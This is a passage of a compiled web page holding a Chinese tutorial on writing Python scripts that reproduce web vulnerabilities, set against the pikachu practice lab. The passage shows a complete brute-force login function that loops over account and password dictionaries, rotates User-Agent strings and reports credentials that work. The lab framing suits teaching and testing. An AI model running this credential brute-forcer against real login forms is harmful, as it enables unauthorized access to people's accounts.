<span class="line"><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#D19A66;--shiki-dark-font-style:italic;">        sleep_second</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">:</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> float</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    ) -&gt; </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">str</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">:</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">    &quot;&quot;&quot;暴力破解</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">    Args:</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">        socket: socket 地址, host-ip:port 的形式  </span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">        url_path: url 路径, 为 url 中 port 后面的 /path 部分   </span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">        browers_json_path: 浏览器头信息 json 文件路径(绝对路径)  </span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">        account_dict_path: 账号字典路径(绝对路径)  </span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">        password_dict_path: 密码字典路径(绝对路径)  </span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">        prefix: 匹配的前缀</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">        suffix: 匹配的后缀  </span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">        fail_keyword: 失败关键字, 用于判断是否登录成功  </span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">        sleep_second: 延时秒数, 应当为一个正的浮点数, 比如 1/0.1 对应 1s/0.1s</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">    Returns:</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">        登录成功的账号密码</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">    &quot;&quot;&quot;</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    # 读取字典文件到列表</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    account_list </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;"> read_dict_to_list</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(account_dict_path)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    account_num </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> len</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(account_list)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    password_list </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;"> read_dict_to_list</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(password_dict_path)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    password_num </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> len</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(password_list)</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    # 最大需要尝试的次数</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    max_try </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> account_num </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">*</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> password_num</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    # 已尝试的次数</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    try_num </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 0</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    user_agent_list </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;"> getUserAgentList</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(browers_json_path)</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    # user_agent_list 长度</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    user_agent_num </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> len</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(user_agent_list)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    # 遍历账号密码列表</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">    for</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> account </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">in</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> account_list:</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">        for</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> password </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">in</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> password_list:</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">            # 编码 password 中的 &amp; 符号(使用 urlencode 会将 &amp; 符号编码为 %26)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">            password </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> password.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">replace</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;&amp;&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;%26&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">            # 以 try_num % user_agent_num 为索引取 user_agent_list 中的 user_agent</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">            user_agent </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> user_agent_list[try_num </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> user_agent_num]</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">            # 发送请求并返回响应结果</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">            response </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;"> post_request</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E06C75;--shiki-dark-font-style:italic;">                socket</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">socket, </span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E06C75;--shiki-dark-font-style:italic;">url_path</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">url_path,</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E06C75;--shiki-dark-font-style:italic;">                user_gent</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">user_agent,</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E06C75;--shiki-dark-font-style:italic;">                username</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">account, </span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E06C75;--shiki-dark-font-style:italic;">password</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">password,</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E06C75;--shiki-dark-font-style:italic;">                prefix</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">prefix, </span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E06C75;--shiki-dark-font-style:italic;">suffix</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">suffix</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">            )</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">            # 判断是否登录成功</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">            if</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> fail_keyword </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">not</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> in</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> response:</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">                print</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">f</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\n</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">当前响应结果为: </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">{</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">response</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">}</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">                return</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> f</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;login success! username: </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">{</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">account</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">}</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">, password: </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">{</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">password</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">}</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">            else</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">:</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">                try_num </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">+=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 1</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">                print</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">f</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\r</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">进度:</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">{</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">try_num</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">}</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">/</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">{</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">max_try</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">}</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E06C75;--shiki-dark-font-style:italic;">end</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">                time_sleep</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(sleep_second)</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">    return</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;破解失败, 可能是字典中无相应账号密码或者操作被限制&quot;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><hr><p>至此, 暴力破解脚本已经完全函数化了, 只会需要的就是写个 <code>main</code> 函数, 然后把具体的参数传入即可</p><p>完整的脚本文件可参阅 <a href="https://github.com/Ayusummer/DailyNotes/blob/main/docs/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/Web%E6%BC%8F%E6%B4%9E%E9%80%9A%E7%94%A8%E5%9E%8BPython%E5%A4%8D%E7%8E%B0%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/pikachu_BruteForce.py" target="_blank" rel="noopener noreferrer">pikachu_bruteForce.py</a></p><p><img src="http://cdn.ayusummer233.top/img/202211122131789.png" alt="image-20221112213146767"></p><hr><p>至此, 全部的流程就完成了</p><hr>`,138)]))}const r=i(e,[["render",l],["__file","index.html.vue"]]),d=JSON.parse('{"path":"/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/Web%E6%BC%8F%E6%B4%9E%E9%80%9A%E7%94%A8%E5%9E%8BPython%E5%A4%8D%E7%8E%B0%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/","title":"Web 漏洞通用型 Python 复现脚本编写指南 V1.0","lang":"zh-CN","frontmatter":{"category":["网络安全","Web安全"],"tags":["指南","教程"],"description":"Web 漏洞通用型 Python 复现脚本编写指南 V1.0 前言 在复现 Web 漏洞的过程中通常会发 HTTP 请求来进行攻击, 这个操作是可以用 Python 的 requests, urllib, aiohttp, httpx 等网络请求库实现的(在此项指南中以 requests 库为例) 因此如果需要重复复现漏洞或是批量复现漏洞的话, 那么编...","head":[["meta",{"property":"og:url","content":"https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/Web%E6%BC%8F%E6%B4%9E%E9%80%9A%E7%94%A8%E5%9E%8BPython%E5%A4%8D%E7%8E%B0%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/"}],["meta",{"property":"og:site_name","content":"DailyNotes"}],["meta",{"property":"og:title","content":"Web 漏洞通用型 Python 复现脚本编写指南 V1.0"}],["meta",{"property":"og:description","content":"Web 漏洞通用型 Python 复现脚本编写指南 V1.0 前言 在复现 Web 漏洞的过程中通常会发 HTTP 请求来进行攻击, 这个操作是可以用 Python 的 requests, urllib, aiohttp, httpx 等网络请求库实现的(在此项指南中以 requests 库为例) 因此如果需要重复复现漏洞或是批量复现漏洞的话, 那么编..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:image","content":"http://cdn.ayusummer233.top/img/20211119092740.png"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2025-04-17T03:32:15.000Z"}],["meta",{"property":"article:tag","content":"指南"}],["meta",{"property":"article:tag","content":"教程"}],["meta",{"property":"article:modified_time","content":"2025-04-17T03:32:15.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"Web 漏洞通用型 Python 复现脚本编写指南 V1.0\\",\\"image\\":[\\"http://cdn.ayusummer233.top/img/20211119092740.png\\",\\"http://cdn.ayusummer233.top/img/202211121845838.png\\",\\"http://cdn.ayusummer233.top/img/202211121855782.png\\",\\"http://cdn.ayusummer233.top/img/202211121854691.png\\",\\"http://cdn.ayusummer233.top/img/202211121907549.png\\",\\"http://cdn.ayusummer233.top/img/202211121907701.png\\",\\"http://cdn.ayusummer233.top/img/202211121908032.png\\",\\"http://cdn.ayusummer233.top/img/202211121912483.png\\",\\"http://cdn.ayusummer233.top/img/202211121913363.png\\",\\"http://cdn.ayusummer233.top/img/202211121914485.png\\",\\"http://cdn.ayusummer233.top/img/202211121917161.png\\",\\"http://cdn.ayusummer233.top/img/202211121917721.png\\",\\"http://cdn.ayusummer233.top/img/202211121919666.png\\",\\"http://cdn.ayusummer233.top/img/202211121921177.png\\",\\"http://cdn.ayusummer233.top/img/202211121924085.png\\",\\"http://cdn.ayusummer233.top/img/202211121933661.png\\",\\"http://cdn.ayusummer233.top/img/202211121955285.png\\",\\"http://cdn.ayusummer233.top/img/202211121955556.png\\",\\"http://cdn.ayusummer233.top/img/202211121937514.png\\",\\"http://cdn.ayusummer233.top/img/202211121957398.png\\",\\"http://cdn.ayusummer233.top/img/202211122006546.png\\",\\"http://cdn.ayusummer233.top/img/202211122009942.png\\",\\"http://cdn.ayusummer233.top/img/202211122010952.png\\",\\"http://cdn.ayusummer233.top/img/202211122015364.png\\",\\"http://cdn.ayusummer233.top/img/202211122017802.png\\",\\"http://cdn.ayusummer233.top/img/202211122020222.png\\",\\"http://cdn.ayusummer233.top/img/202211122037342.png\\",\\"http://cdn.ayusummer233.top/img/202211122037975.png\\",\\"http://cdn.ayusummer233.top/img/202211122018135.png\\",\\"http://cdn.ayusummer233.top/img/202211122043048.png\\",\\"http://cdn.ayusummer233.top/img/202211122046890.png\\",\\"http://cdn.ayusummer233.top/img/202211122051344.png\\",\\"http://cdn.ayusummer233.top/img/202211122054593.png\\",\\"http://cdn.ayusummer233.top/img/202211122131789.png\\"],\\"dateModified\\":\\"2025-04-17T03:32:15.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"咸鱼型233\\",\\"url\\":\\"https://233official.github.io/dailynotes/\\"}]}"]],"date":"2022-11-12T13:39:49.000Z"},"headers":[{"level":2,"title":"前言","slug":"前言","link":"#前言","children":[]},{"level":2,"title":"应用场景","slug":"应用场景","link":"#应用场景","children":[]},{"level":2,"title":"环境准备","slug":"环境准备","link":"#环境准备","children":[{"level":3,"title":"BrupSuit","slug":"brupsuit","link":"#brupsuit","children":[]},{"level":3,"title":"Python","slug":"python","link":"#python","children":[]},{"level":3,"title":"VSCode","slug":"vscode","link":"#vscode","children":[]}]},{"level":2,"title":"演示实例 - 以 pikachu 靶场基于表单的暴力破解为例","slug":"演示实例-以-pikachu-靶场基于表单的暴力破解为例","link":"#演示实例-以-pikachu-靶场基于表单的暴力破解为例","children":[{"level":3,"title":"手工复现漏洞并使用 BurpSuit 拦截请求","slug":"手工复现漏洞并使用-burpsuit-拦截请求","link":"#手工复现漏洞并使用-burpsuit-拦截请求","children":[]},{"level":3,"title":"将 HTTP 请求保存下来并使用 REST Clinet 发送并拷贝 Linux curl 命令","slug":"将-http-请求保存下来并使用-rest-clinet-发送并拷贝-linux-curl-命令","link":"#将-http-请求保存下来并使用-rest-clinet-发送并拷贝-linux-curl-命令","children":[]},{"level":3,"title":"根据 curl 命令生成对应的可供参考的 Python 代码","slug":"根据-curl-命令生成对应的可供参考的-python-代码","link":"#根据-curl-命令生成对应的可供参考的-python-代码","children":[]},{"level":3,"title":"编写复现脚本","slug":"编写复现脚本","link":"#编写复现脚本","children":[]}]}],"git":{"createdTime":1668260389000,"updatedTime":1744860735000,"contributors":[{"name":"233Mac","username":"233Mac","email":"ayusummer233@vip.qq.com","commits":3,"url":"https://github.com/233Mac"},{"name":"233Official","username":"233Official","email":"ayusummer233@qq.com","commits":1,"url":"https://github.com/233Official"},{"name":"咸鱼型233","username":"咸鱼型233","email":"ayusummer233@qq.com","commits":2,"url":"https://github.com/咸鱼型233"}]},"readingTime":{"minutes":15.3,"words":4589},"filePathRelative":"网络安全/Web安全/Web漏洞通用型Python复现脚本编写指南/index.md","localizedDate":"2022年11月12日","excerpt":"","autoDesc":true}');export{r as comp,d as data};
